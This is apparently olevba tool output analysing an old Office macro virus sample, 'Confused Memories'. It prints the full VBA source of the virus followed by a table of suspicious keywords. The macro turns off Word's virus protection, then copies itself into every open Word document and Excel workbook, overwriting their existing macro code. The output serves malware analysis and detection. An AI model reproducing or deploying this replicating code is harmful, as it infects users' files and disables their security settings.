olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused.e-9198f03b39e9c85c121ceb3fe5b78505a287e982
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Confused.e-9198f03b39e9c85c121ceb3fe5b78505a287e982 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Copyright (C) 1998 by FlyShadow ~^^~ - Confused Memories
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Application.EnableCancelKey = 0
With ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule
£f = .Lines(1, .CountOfLines + 1): End With
Err.Clear: Set £o = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If Not £o.Find("~^^~", 0, 0, 0, 0) Then £o.DeleteLines 1, £o.CountOfLines: £o.AddFromString £f
For £d = 1 To Documents.Count
With Documents(£d).VBProject.VBComponents("ThisDocument").CodeModule
If Not .Find("~^^~", 0, 0, 0, 0) Then
.DeleteLines 1, .CountOfLines
.AddFromString £f
End If: End With: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.EnableCancelKey = 0
With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
£f = .Lines(1, .CountOfLines + 1): End With
Err.Clear: Set £o = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If Not £o.Find("~^^~", 0, 0, 0, 0) Then £o.DeleteLines 1, £o.CountOfLines: £o.AddFromString £f
For £d = 1 To Workbooks.Count
With Workbooks(£d).VBProject.VBComponents("ThisWorkbook").CodeModule
If Not .Find("~^^~", 0, 0, 0, 0) Then
.DeleteLines 1, .CountOfLines
.AddFromString £f
End If: End With: Next
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

